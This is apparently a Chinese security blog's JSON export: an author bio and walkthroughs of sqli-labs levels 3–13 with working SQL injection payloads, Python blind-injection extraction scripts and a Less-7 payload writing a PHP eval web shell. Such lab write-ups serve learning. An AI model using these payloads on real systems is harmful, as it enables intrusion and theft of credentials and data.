{"meta":{"title":"1eAder","subtitle":"一个热爱网络技术的少年(已不是少年).","description":"本博客专注于ctf比赛和网络安全攻防技术，热爱网络技术并且也很愿意结交热爱网络技术的你们.我是一个热爱网络技术的少年","author":"1eAder","url":"https://leaderzhang.github.io"},"pages":[{"title":"categories","date":"2018-10-12T15:01:37.000Z","updated":"2018-10-12T15:01:37.263Z","comments":true,"path":"categories/index.html","permalink":"https://leaderzhang.github.io/categories/index.html","excerpt":"","text":""},{"title":"about","date":"2018-10-12T03:13:08.000Z","updated":"2018-10-12T07:34:18.178Z","comments":true,"path":"about/index.html","permalink":"https://leaderzhang.github.io/about/index.html","excerpt":"","text":"关于我(1eAder) &emsp;&emsp;喜欢网络技术的一个人少年…但是，我好像已不在是少年了。&emsp;&emsp;是呀，一晃都已经大三了，过的真快。 ##意识——学习安全的“火苗”&emsp;&emsp;了解网络技术这一块是从小学六年级的时候，那时候打游戏，突然了解到外挂这个东西，就去各个论坛上找外挂，什么猴岛、QQTZ这些论坛。然后，账号就被盗了。。。当时是DNF账号被洗得一干二净，那个时代一把紫剑就可以炫耀半天，结果就被洗号了。所以就对安全意识有提高了，知道要怎么来防御盗号，QQ密保这些东西得用上。 ##怒火——学习安全的“动力”&emsp;&emsp;之后，又被盗了一次号，那时候原因也忘了，只记得当时十分的气愤，因为盗号者用我的QQ向我们班上的女同学要了100块钱。。。那时候才六年级呀。。然后女同学就被骗了一百，So，我真的很生气，为了报复，我开始百度——“盗号”这一关键词，那个时候的盗号技术就是用易语言写钓鱼软件，两个输入框，一个按钮，伪装成QQ登陆界面或者刷钻软件，后台用asp程序或者QQ邮箱接收账号密码。我就去了解了易语言，不得不说，他是我们中国人计算机软件发明中，可以算伟大的一类软件了。至今，几乎所有游戏外挂都是用易语言写的。&emsp;&emsp;到了初中，我自学了(asp旋风+3322动态域名+新云asp程序)这类简单的简单建站技术，还去学习了灰鸽子怎么使用，怎么基础的免杀(花指令)。还有用啊D注入工具这些软件进行sql批量注入攻击。初中的时候对这些是最有时间又最感兴趣的，那时候研究怎么搞坏别人电脑，怎么去骗别人打开软件——社工。平均我家一个星期坏一次电脑，然后拿去重装系统。&emsp;&emsp;当然，我也要打游戏，谈恋爱~ ##瞎混——进入安全的“开始”&emsp;&emsp;差不多初中结束的时候，开始对网站渗透这一块很感兴趣了，当然，我是一个脚本小子，没有什么实质上的研究，就拿着胡萝卜、啊D等工具，到处试注入点。对了，那时候的黑客，没有不知道乌云的。那时候的流行的技术开始向XSS这方面发展了，最出名的一个就是乌云上的一个系列，然后就是剑心——xsser。那时候开始逛习科、法克(听潮)、社工联盟、红客联盟等论坛。后来，就是高中了，高中就玩去了，只拿过学校网站首页和学校wifi这些。那时候刷一会儿补天。。。 ##重生——重新开始的“决心”&emsp;&emsp;上了大学，发现自己真的很多东西都不懂，但是以前的经历又给我带来了很多别人没有的意识和思维。学习安全这块，思维和意识是最重要的东西。知识含量都不算很重要，因为可以现学习。所以，我开始疯狂学习，Linux，Windows，Python，Php，msf等。Linux真的很重要，至少把shell脚本学习好了，不差没饭吃。Windows也很重要，在大公司里，都是域的天下。Python和php是学习安全的基础，但是我学的不精，只是能看懂，但真正老老实实写，还是不行，但是可以靠复制粘贴写出一个项目。为什么发现自己不足呢？因为，在2017年12月份的时候，我去参加了人生第一个CTF比赛，那时候我们学校两个队，但是另一个队比我厉害了。我自认为我比他们不差，可是我们属于倒数的名次。所以，我下定决心，下次，我要超越他们。So，我开始有了目标，了解CTF这些技术的实质。其实就是套路而已，你需要去猜出题人的点，猜到，你就getflag，否则就干望着。我开始对Web这方面的CTF题型研究，并且对python这块也开始学习。终于，在代表学校参加的重庆市高职技能大赛中，获得二等奖，为学校拿下代表重庆出线的名额。到了全国的比赛，那真的是了解到了山外有山。也知道了，别人学校愿意花钱培养学生，重视信息安全这方面，舍得投入。&emsp;&emsp;对了，在学习的期间，我还是每天都养成逛论坛和安全方面的网站的习惯。&emsp;像Freebuf 安全客这些是现在比较好的安全资讯网站 文章来自1eAder创作，转载请联系本人 作者 @1eAder2018 年 10月 11日"}],"posts":[{"title":"sqli-labs-less13通关笔记","slug":"sqli-labs-less13","date":"2018-10-29T02:45:11.000Z","updated":"2018-10-29T02:45:37.241Z","comments":true,"path":"2018/10/29/sqli-labs-less13/","link":"","permalink":"https://leaderzhang.github.io/2018/10/29/sqli-labs-less13/","excerpt":"","text":"Sql注入学习笔记——基于Sqli-labs平台(Less-13)第十三关，还是个登录框。。。 单引号测试一下，可以看到报错了 那么我们就知道了，他跟第十二关相比较，只是把双引号改为单引号 so 万能密码payload：123uname=admin&apos;) or &apos;1&apos;=1#passwd=sadsubmit=Submit 报错注入payload:&#39;) and (updatexml(1,concat(0x7e,((select username from users limit 0,1)),0x7e),1))# OK！第十三关也完成了。。","categories":[{"name":"sqli-labs","slug":"sqli-labs","permalink":"https://leaderzhang.github.io/categories/sqli-labs/"}],"tags":[{"name":"sqli-labs","slug":"sqli-labs","permalink":"https://leaderzhang.github.io/tags/sqli-labs/"}]},{"title":"sqli-labs-less12通关笔记","slug":"sqli-labs-less12","date":"2018-10-29T02:32:10.000Z","updated":"2018-10-29T02:32:33.838Z","comments":true,"path":"2018/10/29/sqli-labs-less12/","link":"","permalink":"https://leaderzhang.github.io/2018/10/29/sqli-labs-less12/","excerpt":"","text":"Sql注入学习笔记——基于Sqli-labs平台(Less-12)第十二关也是一个基于POST请求的报错注入 只是将第十一关的闭合符号(单引号)改成了双引号加括号&quot;) 所以我这里只列payload 万能密码登陆payload: username:admin”) or ‘1’=1#password:asd 注入payload： username:asd password:&quot;) and (updatexml(1,concat(0x7e,((select username from users limit 0,1)),0x7e),1))# OK~第十二关，完成啦","categories":[{"name":"sqli-labs","slug":"sqli-labs","permalink":"https://leaderzhang.github.io/categories/sqli-labs/"}],"tags":[{"name":"sqli-labs","slug":"sqli-labs","permalink":"https://leaderzhang.github.io/tags/sqli-labs/"}]},{"title":"sqli-labs-less11通关笔记","slug":"sqli-labs-less11","date":"2018-10-26T03:03:49.000Z","updated":"2018-10-26T03:06:30.803Z","comments":true,"path":"2018/10/26/sqli-labs-less11/","link":"","permalink":"https://leaderzhang.github.io/2018/10/26/sqli-labs-less11/","excerpt":"","text":"Sql注入学习笔记——基于Sqli-labs平台(Less-11)发现题目有一个登录框看到登陆框，就想到万能密码。 这里情况在实战中分为两种：1.万能密码登陆后台，登陆后找地方拿shell2.如果会报错，post报错注入拿数据库信息 万能密码其实万能密码归根结底，也是sql注入 先单引号测试下在username输入框输入一个单引号，password随便输入 可以看到报错了 报错点在a&#39; LIMIT 0,1 在password输入一个单引号，username随便输入 发现也可以报错 报错点在&#39;&#39;&#39; LIMIT 0,1 我是根据经验来猜测的。。 后台语句应该为：select * from users where username = &#39;$username&#39; and password = &#39;$password&#39; limit 0,1 其实很好推断出来，先写好一个固定式:select * from users where username = 未知 and password = 未知 limit 0,1 再根据不同地方的单引号报错信息，推断出未知部分 然后在username输入&#39; or &#39;1&#39;=1#password随便输入后 可以看到，成功登陆了。。 如果不想去构思payload的话，直接用万能密码进行爆破 POST登录框报错注入由于这里会显示详细的报错信息，那么我们就利用报错注入来操作一下，跟前面的报错注入一样，只不过是将get改为post。而post的参数在url中是看不到的 在username随便输入，password处输入payload: &#39; and (updatexml(1,concat(0x7e,(select user()),0x7e),1))# 查询表名： payload：&#39; and (updatexml(1,concat(0x7e,((select table_name from information_schema.tables where table_schema=database() limit 0,1)),0x7e),1))# 查询字段名： payload:&#39; and (updatexml(1,concat(0x7e,((select column_name from information_schema.columns where table_name=&#39;users&#39; and table_schema=database() limit 1,1)),0x7e),1))# 查询内容： payload:&#39; and (updatexml(1,concat(0x7e,((select username from users limit 0,1)),0x7e),1))# ok，第十一关也完成了~","categories":[{"name":"sqli-labs","slug":"sqli-labs","permalink":"https://leaderzhang.github.io/categories/sqli-labs/"}],"tags":[{"name":"sqli-labs","slug":"sqli-labs","permalink":"https://leaderzhang.github.io/tags/sqli-labs/"}]},{"title":"sqli-labs-less10通关笔记","slug":"sqli-labs-less10","date":"2018-10-26T03:02:52.000Z","updated":"2018-10-26T03:03:41.413Z","comments":true,"path":"2018/10/26/sqli-labs-less10/","link":"","permalink":"https://leaderzhang.github.io/2018/10/26/sqli-labs-less10/","excerpt":"","text":"Sql注入学习笔记——基于Sqli-labs平台(Less-10)第十关，是第九关的哥哥 其实就是双引号闭合，基于时间的盲注。。。 所以我这里就不多讲了，对于脚本和方法，直接用第九关的。把单引号改为双引号即可。 但是我在第十关还是总结一下 在实战中，网站基于时间注入的例子不是很多，因为在设计网站的时候，实现前后端的互动，需要有不一样的页面呈现。所以，网页多少会有一些显示。即使没有显示，有可能http-headers中的content-lenth的大小也会改变。可以根据这个来判断页面的错误与否。","categories":[{"name":"sqli-labs","slug":"sqli-labs","permalink":"https://leaderzhang.github.io/categories/sqli-labs/"}],"tags":[{"name":"sqli-labs","slug":"sqli-labs","permalink":"https://leaderzhang.github.io/tags/sqli-labs/"}]},{"title":"sqli-labs-less9通关笔记","slug":"sqli-labs-less9","date":"2018-10-25T05:30:28.000Z","updated":"2018-10-25T05:31:49.472Z","comments":true,"path":"2018/10/25/sqli-labs-less9/","link":"","permalink":"https://leaderzhang.github.io/2018/10/25/sqli-labs-less9/","excerpt":"","text":"Sql注入学习笔记——基于Sqli-labs平台(Less-9)首先，我们看到题目的名称为 GET - Blind - Time based. - Single Quotes (基于时间的GET单引号盲注) 所以我们可以知道，这里需要使用单引号和时间盲注等手法来完成。但是我们在实战中如何判断 &emsp;&emsp;在我们注入了SQL代码之后，存在以下两种情况：如果注入的SQL代码不影响后台[数据库]的正常功能执行，那么Web应用的页面显示正确（原始页面）。&emsp;&emsp;如果注入的SQL代码影响后台数据库的正常功能（产生了SQL注入），但是此时Web应用的页面依旧显示正常（原因是Web应用程序采取了“重定向”或“屏蔽”措施）。&emsp;&emsp;这时候，我们就会产生一个疑问：我们注入的的SQL代码到底被后台数据库执行了没有？即Web应用程序是否存在SQL注入？&emsp;&emsp;面对这种情况，之前讲的基于布尔的SQL盲注就很难发挥作用了（因为基于布尔的SQL盲注的前提是Web程序返回的页面存在true和false两种不同的页面）。这时，我们一般采用基于web应用响应时间上的差异来判断是否存在SQL注入，即基于时间型SQL盲注。 这段话是我在别人博客中看到的，一般来说，在页面没有任何回显和错误信息提示的时候，我们就会测试时间盲注这最后的手法。但是，我们如何从单引号判断开始来进行sql注入，这对于手工注入来说，是很难的。因为我们需要进行许多测试，单引号，双引号，括号等，不断的尝试闭合语句的符号到底是哪个或者哪些。所以，在这种情况下，我一般都是使用sqlmap这类工具来进行注入。 好像也是一段废话。。。。 但是，我找了很久，还是没有找到一篇合适的文章来讲解，如何从0开始进行盲注，我也很奇怪在不看源码的情况下，如何对闭合语句进行判断。因为如何不能正确的判断闭合语句，那么就不会产生sql语句的拼接。实战中，我们如果可以获取网站后台源码，那就可以清楚的知道闭合语句是什么。但是往往我们无法对网站后台源码进行查看，所以最好的办法就是利用burpsuite和字典进行参数的fuzz爆破。 字典类似如下: ‘“‘)“)}...等等 说白了，也跟sqlmap一样，对参数进行fuzz。 好了，说了这么多没用的，我们开始我们的第九关~ 我们知道是单引号的闭合后，我们就方便很多。 常用的判断语句: ‘and if(1，sleep(5),1) %23 ‘ and if(1=0,1, sleep(10)) –+ “ and if(1=0,1, sleep(10)) –+ ) and if(1=0,1, sleep(10)) –+ ‘) and if(1=0,1, sleep(10)) –+ “) and if(1=0,1, sleep(10)) –+ 这里我用的是&#39;and if(1，sleep(5),1) %23 在index.php?id=1后加上这句payload会延时5秒才返回页面，可以从控制台的network中查看时间 但是我这里突然发现，Content-length的长度不一样，也可以来判断页面正常与否，所以其实这题可以用布尔型盲注来解决。 好了，基于时间盲注的payload有很多，基本原理是使用if函数来判断条件是否成立。 我使用的payload:id=1’ and If(mid((select schema_name from information_schema.schemata limit 0,1),2,1)=’h’,1,sleep(5))–+ 这里修改加粗部分就行，以下是python脚本代码：12345678910111213141516171819202122232425262728293031323334353637import requestsimport timeimport stringurl = &quot;http://sql-test.com/less-9/index.php?id=1&quot;def sqli(urls): r = requests.get(url=urls) if time.time() - start_time &gt;3: return 1 else: return 0def main(): info = &quot;&quot; global start_time payload_get_db_lenth = &quot;&apos; and if (length(database())=&#123;0&#125;,1,sleep(5))%23&quot; #如果数据库长度等于8，则页面无延迟返回，如果不为8，则延时5秒返回。 payload_get_db_name = &quot;&apos; and if (mid(database(),&#123;0&#125;,1)=&apos;&#123;1&#125;&apos;,1,sleep(5))%23&quot; #占位符&#123;0&#125;表示数据库名的第几位,&#123;1&#125;表示字符 payload_get_table_lenth = &quot;&apos; and if (length((select table_name from information_schema.tables where table_schema=database() limit &#123;0&#125;,1))=&#123;1&#125;,1,sleep(5))%23&quot;#占位符&#123;0&#125;表示当前数据库的第几个表 ，&#123;1&#125;表示长度 payload_get_table_name = &quot;&apos; and if (mid((select table_name from information_schema.tables where table_schema=database() limit &#123;0&#125;,1),&#123;1&#125;,1)=&apos;&#123;2&#125;&apos;,1,sleep(5))%23&quot;#占位符&#123;0&#125;表示第几个表，&#123;1&#125;表示表的第几位，&#123;2&#125;表示字符 payload_get_columns_lenth = &quot;&apos; and if (length((select column_name from information_schema.columns where table_name = &apos;users&apos; and table_schema = &apos;security&apos; limit &#123;0&#125;,1))=&apos;&#123;1&#125;&apos;,1,sleep(5))%23&quot; payload_get_columns_name = &quot;&apos; and if (mid((select column_name from information_schema.columns where table_name = &apos;users&apos; and table_schema = &apos;security&apos; limit &#123;0&#125;,1)),&#123;1&#125;,1)=&apos;&#123;2&#125;&apos;,1,sleep(5))%23)&quot; payload_get_data = &quot;&apos; and if (mid((select username from users limit &#123;0&#125;,1),&#123;1&#125;,1)=&apos;&#123;2&#125;&apos;,1,sleep(5))%23&quot; payload_get_data2 = r&quot;&apos; and if (mid((select username from users limit 0,1),&#123;0&#125;,1)=&apos;&#123;1&#125;&apos;,sleep(5),1)%23&quot; payloads = &quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot; for i in range(1,9): for k in payloads: start_time=time.time() urls = url+payload_get_data2.format(i,k) flag=sqli(urls) print(urls) if flag ==1: info +=k print(&quot;[+]第%s位内容为:%s&quot;%(i,k)) print(&quot;数据内容：&quot;,info)if __name__ == &apos;__main__&apos;: main() 但是我发现，mysql中是不区分大小写的，查了一会才知道，需要将数据库的字符集改一下。不得不说，这的确是个坑哦，不过用ascii来判断应该就不存在这个问题了！ 好了，第九关也完成啦~","categories":[{"name":"sqli-labs","slug":"sqli-labs","permalink":"https://leaderzhang.github.io/categories/sqli-labs/"}],"tags":[{"name":"sqli-labs","slug":"sqli-labs","permalink":"https://leaderzhang.github.io/tags/sqli-labs/"}]},{"title":"sqli-labs-less8通关笔记","slug":"sqli-labs-less8","date":"2018-10-24T06:31:04.000Z","updated":"2018-10-24T07:02:59.375Z","comments":true,"path":"2018/10/24/sqli-labs-less8/","link":"","permalink":"https://leaderzhang.github.io/2018/10/24/sqli-labs-less8/","excerpt":"","text":"Sql注入学习笔记——基于Sqli-labs平台(Less-8)第八关 单引号测试： 可以看出报错，但是页面没有任何报错信息了，所以这关应该是盲注了。 闭合语句测试： 接下来测试下and 1=1和and 1=2的页面显示。因为我需要知道，是否会使语句产生逻辑错误。 and 1=1测试结果： and 1=2测试结果： 并且，测试and 1=1和and 1=2的理由是我需要测试and运算符能否正常使用。 这里我们可以使用的盲注手法：&emsp;&emsp;布尔型盲注&emsp;&emsp;时间型盲注 这里我选择布尔盲注，而盲注通常是跟python这类脚本代码结合起来使用的。 所以，我这里直接payload和代码： 盲注流程： 猜测数据库长度 猜测数据库名 猜测表的长度 猜测表名内容 猜测字段长度 猜测字段内容 1.猜测数据库长度：主要payload： Less-8/index.php?id=1&#39; and length(database())&gt;{0}%23变化的是{0}这个部分 python脚本代码： 1234567891011121314151617# -*- coding: UTF-8 -*-import requestsimport timedef getdblenth(): for i in range(1,100): url_t=&quot;http://sql-test.com/Less-8/index.php?id=1&apos; and length(database())&gt;&#123;0&#125;%23&quot; tzm=&quot;You are in...........&quot; url=url_t.format(i) r = requests.get(url) if tzm in r.text: print(url,i) else: print(&quot;the lenth of database is :&quot;,i) break getdblenth() 效果图： 2.猜测数据库名：主要payload： less-8/index.php?id=1&#39; and ascii(substr(database(),{0},1))&gt;{1} %23这里变化的是{0}和{1} {0}代表数据库的第几位{1}代表acsii码的数值 python脚本代码： 1234567891011121314151617181920212223# -*- coding:utf-8 -*-import requestsimport timedef get_db_name(): result = &quot;&quot; url_template = &quot;http://sql-test.com/less-8/index.php?id=1&apos; and ascii(substr(database(),&#123;0&#125;,1))&gt;&#123;1&#125; %23&quot; chars = &apos;abcdefghijklmnopqrstuvwxyz&apos; for i in range(1,9): for char in chars: char_ascii = ord(char) url = url_template.format(i,char_ascii) response = requests.get(url) length = len(response.text) #返回的长度只有706和722 if length&gt;706: result += char print(length,char,char_ascii) break print(result)get_db_name() 效果图： 3.获取表的长度主要payload：Less-8/index.php?id=1&#39; and (select length(table_name) from information_schema.tables where table_schema=database() limit 0,1)&gt;{0} %23 这里变化的{0}就是表的长度 python脚本代码：123456789101112131415161718# -*- coding:utf-8 -*-import requestsimport timedef gettablelength(): for i in range(1,100): url_t=&quot;http://hack.cn/Less-8/?id=1&apos; and (select length(table_name) from information_schema.tables where table_schema=database() limit 0,1)&gt;&#123;0&#125; %23&quot; # tzm=&quot;You are in...........&quot; url=url_t.format(i,i) r = requests.get(url) if tzm in r.text: print(url,i) else: print(&quot;the lenth of table is :&quot;,i) break gettablelength() 修改limit 后的0,1 来获取第二个表的长度 效果图： 4.获取表名主要payload：Less-8/index.php?id=1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),{0},1))&gt;{1} %23 limit后的0，1控制第几张表{0}控制表名的第几位{1}控制ascii码 python脚本代码： 1234567891011121314151617181920# -*- coding:utf-8 -*-import requestsimport timedef get_table_name(): result = &quot;&quot; url_template = &quot;http://sql-test.com/Less-8/index.php?id=1&apos; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),&#123;0&#125;,1))&gt;&#123;1&#125; %23&quot; chars = &apos;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&apos; for i in range(1,7): for char in chars: char_ascii = ord(char) url = url_template.format(i,char_ascii) response = requests.get(url) length = len(response.text) #返回的长度只有706和722 if length&gt;706: result += char break print(result)get_table_name() 效果图： 5.获取字段长度主要payload:Less-8/index.php?id=1&#39; and (select length(column_name) from information_schema.columns where table_name=0x656d61696c73 limit 1,1)&gt;{0} %23 修改table后的参数来获取指定表的字段长度修改num 来判断字段长度是否大于这个num修改limit 后的0,1来获取第二个字段的长度，顺便还可以判断字段数量 python脚本代码： 123456789101112131415161718# -*- coding:utf-8 -*-import requestsimport timedef getclolumnlength(): for i in range(1,100): url_t=&quot;http://sql-test.com/Less-8/index.php?id=1&apos; and (select length(column_name) from information_schema.columns where table_name=0x656d61696c73 limit 1,1)&gt;&#123;0&#125; %23 &quot; tzm=&quot;You are in...........&quot; url=url_t.format(i,i) r = requests.get(url) if tzm in r.text: print(url,i) else: print(&quot;the lenth of columns is :&quot;,i) break getclolumnlength() 效果图： 6.获取字段名主要payload: Less-8/index.php?id=2&#39; and ascii(substr((select column_name from information_schema.columns where table_name=0x656d61696c73 limit 0,1),{0},1))&gt;{1} %23 python脚本代码： 123456789101112131415161718192021# -*- coding:utf-8 -*-import requestsimport timedef get_column_name(): result = &quot;&quot; url_template = &quot;http://sql-test.com/Less-8/index.php?id=2&apos; and ascii(substr((select column_name from information_schema.columns where table_name=0x656d61696c73 limit 0,1),&#123;0&#125;,1))&gt;&#123;1&#125; %23&quot; chars = &apos;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz&apos; for i in range(1,3): for char in chars: char_ascii = ord(char) url = url_template.format(i,char_ascii) response = requests.get(url) length = len(response.text) #返回的长度只有706和722 if length&gt;706: result += char print(char) break print(result)get_column_name() 效果图： OK~这里就差最后一步啦获取字段的内容，也需要一个个去猜 7.获取内容主要payload:Less-8/index.php?id=2&#39; and ascii(substr((select username from users limit 0,1),{0},1))&gt;{1} %23 python脚本代码： 123456789101112131415161718192021# -*- coding:utf-8 -*-import requestsimport timedef get_data(): result = &quot;&quot; url_template = &quot;http://sql-test.com/Less-8/index.php?id=2&apos; and ascii(substr((select username from users limit 0,1),&#123;0&#125;,1))&gt;&#123;1&#125; %23&quot; chars = &apos;.0123456789@ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz&apos; for i in range(1,17): for char in chars: char_ascii = ord(char) url = url_template.format(i,char_ascii) response = requests.get(url) length = len(response.text) #返回的长度只有706和722 if length&gt;706: result += char print(char) break print(result)get_data() 效果图： OK~第八关也完成了，就是写代码有点麻烦？？","categories":[{"name":"sqli-labs","slug":"sqli-labs","permalink":"https://leaderzhang.github.io/categories/sqli-labs/"}],"tags":[{"name":"sqli-labs","slug":"sqli-labs","permalink":"https://leaderzhang.github.io/tags/sqli-labs/"}]},{"title":"sqli-labs-less-7通关笔记","slug":"sqli-labs-less7","date":"2018-10-23T05:15:16.000Z","updated":"2018-10-23T05:16:35.993Z","comments":true,"path":"2018/10/23/sqli-labs-less7/","link":"","permalink":"https://leaderzhang.github.io/2018/10/23/sqli-labs-less7/","excerpt":"","text":"Sql注入学习笔记——基于Sqli-labs平台(Less-7)页面提示：You are in.... Use outfile...... 关键词outfile 我们知道，select查询可以对文件有操作：&emsp;&emsp;读取文件：load_file()&emsp;&emsp;导出文件:into outfile() 所以，这里应该是想让我们利用outfile的文件来查看回显，也可以选择outfile一句话木马来getshell。 先测试单引号，会报错。 但是我们发现，报错信息没有像之前一样，输出一些有用的信息 对id参数(闭合语句的条件)进行一波fuzz 单引号测试：index.php?id=1&#39;%23 ===&gt; You have an error in your SQL syntax双引号测试：index.php?id=1&quot;%23 ===&gt; You are in.... Use outfile...... 从以上两条信息可以推断出，单引号是闭合语句的条件之一接着带着单引号进行fuzz 单引号加括号：index.php?id=1&#39;)%23 ===&gt; You have an error in your SQL syntax单引号加两个括号:index.php?id=1&#39;))%23 ===&gt; You are in.... Use outfile......ok，这里我们测试出了正确的闭合语句，可以推断后端查询语句为： select * from users where id =((&#39;$id&#39;)) 这里为什么是直接推断单引号后面跟上括号呢？&emsp;因为php脚本语言的原因，能识别的解析变量的字符就那几个，单引号、双引号、括号等 接下来我们需要知道物理路径，但是这在第七关，有些麻烦，因为我们这道题相当于盲注 并且我们无法利用Mysql来爆php程序的物理路径 所以，我们可通过盲注来获取users表的信息。但是题目要求outfile，那我们自己就给自己一个物理路径。 我的目录：E:\\sqli-labs\\Less-7 我这里省略了order by猜字段数 构造payload：index.php?id=1&#39;)) union select database(),user(),version() into outfile &#39;E:\\\\sqli-labs\\\\Less-7\\\\out1.txt&#39;%23 我们可以查询users表的数据： payload:index.php?id=1&#39;)) union select 1,username,password from users into outfile &#39;E:\\\\sqli-labs\\\\Less-7\\\\out2.txt&#39;%23 其实这里我们可以直接生成一句话木马来getshell，这样操作方便些。 payload：index.php?id=1&#39;)) union select 1,2,&quot;&lt;?php @eval($_POST[&#39;leader&#39;]);?&gt;&quot; into outfile &#39;E:\\\\sqli-labs\\\\Less-7\\\\muma.php&#39;%23 OK~第七关！完成咯~","categories":[{"name":"sqli-labs","slug":"sqli-labs","permalink":"https://leaderzhang.github.io/categories/sqli-labs/"}],"tags":[{"name":"sqli-labs","slug":"sqli-labs","permalink":"https://leaderzhang.github.io/tags/sqli-labs/"}]},{"title":"sqli-labs-less-6通关笔记","slug":"sqli-labs-less6","date":"2018-10-22T06:41:22.000Z","updated":"2018-10-22T06:42:04.194Z","comments":true,"path":"2018/10/22/sqli-labs-less6/","link":"","permalink":"https://leaderzhang.github.io/2018/10/22/sqli-labs-less6/","excerpt":"","text":"Sql注入学习笔记——基于Sqli-labs平台(Less-6)第六关啦~ 老规矩，单双引号测试。 发现双引号报错信息如下： You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&quot;1&quot;&quot; LIMIT 0,1&#39; at line 1 闭合语句看看：那看来是跟第5关没啥区别，这里我就直接操作，贴payload啦 查当前用户名： Payload:index.php?id=1%22%20and%20(updatexml(1,concat(0x7e,(select%20user()),0x7e),1))%23 查询当前数据库名： Payload:index.php?id=1%22%20and%20(updatexml(1,concat(0x7e,(select%20database()),0x7e),1))%23 查询表名： Payload:index.php?id=1%22%20and%20(updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 3,1),0x7e),1))%23 查询列名： Payload：index.php?id=1%22%20and%20(updatexml(1,concat(0x7e,(select%20column_name%20from%20information_schema.columns%20where%20table_schema=%27security%27%20and%20table_name=%27users%27%20limit%201,1),0x7e),1))%23 爆数据： Payload:index.php?id=1%22%20and%20(updatexml(1,concat(0x7e,(select%20password%20from%20users limit 4,1),0x7e),1))%23 第六关~完成","categories":[{"name":"sqli-labs","slug":"sqli-labs","permalink":"https://leaderzhang.github.io/categories/sqli-labs/"}],"tags":[{"name":"sqli-labs","slug":"sqli-labs","permalink":"https://leaderzhang.github.io/tags/sqli-labs/"}]},{"title":"sqli-labs-less-5通关笔记","slug":"sqli-labs-less5","date":"2018-10-22T03:01:22.000Z","updated":"2018-10-22T03:02:19.151Z","comments":true,"path":"2018/10/22/sqli-labs-less5/","link":"","permalink":"https://leaderzhang.github.io/2018/10/22/sqli-labs-less5/","excerpt":"","text":"Sql注入学习笔记——基于Sqli-labs平台(Less-5)首先，老规矩，单双引号测试。发现单引号报错，语句如下You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;1&#39;&#39; LIMIT 0,1&#39; at line 1 闭合语句试试 这一关可以报错，但是没有回显位，说明是报错注入 十种Mysql报错注入的语句：https://www.cnblogs.com/wocalieshenmegui/p/5917967.html 我一般喜欢用updatexml()或者floor报错常用的 Updatexml报错注入的Payload：index.php?id=1%27%20and%20(updatexml(1,concat(0x7e,(select%20user()),0x7e),1))%23 Floor报错注入的Payload：index.php?id=1%27%20and%20(select%201%20from%20(select%20count(*),concat(user(),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)%23 报错注入显示数据库： payload:index.php?id=1%27%20and%20(updatexml(1,concat(0x7e,(select database()),0x7e),1))%23 报错注入显示表名： Payload:index.php?id=1%27%20and%20(updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1),0x7e),1))%23 我偷懒，直接显示第四个表名了，不一个一个列出来了。 显示第四个表名： Payload:index.php?id=1%27%20and%20(updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 3,1),0x7e),1))%23 接下来爆列名我也直接偷懒啦~直接爆第二个列名，username Payload：index.php?id=1%27%20and%20(updatexml(1,concat(0x7e,(select%20column_name%20from%20information_schema.columns%20where%20table_schema=%27security%27%20and%20table_name=%27users%27%20limit%201,1),0x7e),1))%23 ok！我们得知数据库名为security，表名为users，列名：id,username,password 直接爆数据 报错显示第5行的username字段内容： payload：index.php?id=1%27%20and%20(updatexml(1,concat(0x7e,(select%20username%20from%20users limit 4,1),0x7e),1))%23 接下来报错显示第5行的password字段内容： payload:index.php?id=1%27%20and%20(updatexml(1,concat(0x7e,(select%20password%20from%20users limit 4,1),0x7e),1))%23 得到username:stupid password:stupidity 完成第五关","categories":[{"name":"sqli-labs","slug":"sqli-labs","permalink":"https://leaderzhang.github.io/categories/sqli-labs/"}],"tags":[{"name":"sqli-labs","slug":"sqli-labs","permalink":"https://leaderzhang.github.io/tags/sqli-labs/"}]},{"title":"sqli-labs-less-4通关笔记","slug":"sqli-labs-less4","date":"2018-10-19T08:49:41.000Z","updated":"2018-10-19T09:12:53.571Z","comments":true,"path":"2018/10/19/sqli-labs-less4/","link":"","permalink":"https://leaderzhang.github.io/2018/10/19/sqli-labs-less4/","excerpt":"","text":"Sql注入学习笔记——基于Sqli-labs平台(Less-4)第四关开始 老规矩，单引号测试下 哟呵，小娘子，没报错。那么咱们就测试下双引号 发现报错了，报错内容：near &#39;&quot;1&quot;&quot;) LIMIT 0,1&#39; at line 1 ok，猜测后台查询语句格式如下： select * from users where id = (&quot;$id&quot;) limit 0,1 输入index.php?id=1&quot;)--+测试 页面正常了，证明语句闭合成功，接下来就是老套路了。 测试and 1=1和and 1=2 order by 查询字段数量index.php?id=1&quot;) order by 1--+..index.php?id=1&quot;) order by 4--+测试出为三个字段 接下来测试回显位 index.php?id=-1&quot;) union select 1,2,3--+ 回显位为2和3 然后就是老步骤了。。。 所以我就直接最后一步 index.php?id=-1&quot;) union select 1,username,password from users limit 3,1--+ 为了验证注入成功，我选择users表中的第4行数据","categories":[{"name":"sqli-labs","slug":"sqli-labs","permalink":"https://leaderzhang.github.io/categories/sqli-labs/"}],"tags":[{"name":"sqli-labs","slug":"sqli-labs","permalink":"https://leaderzhang.github.io/tags/sqli-labs/"}]},{"title":"sqli-labs-less-3通关笔记","slug":"sqli-labs-less3","date":"2018-10-19T06:56:34.000Z","updated":"2018-10-19T07:31:56.486Z","comments":true,"path":"2018/10/19/sqli-labs-less3/","link":"","permalink":"https://leaderzhang.github.io/2018/10/19/sqli-labs-less3/","excerpt":"","text":"Sql注入学习笔记——基于Sqli-labs平台(Less-3)废话不多说，继续干 单引号测试 发现报错，内容为： near ''1'') LIMIT 0,1' at line 1 猜测后台语句结构为： select * from users where id = (&#39;$id&#39;) limit 0,1 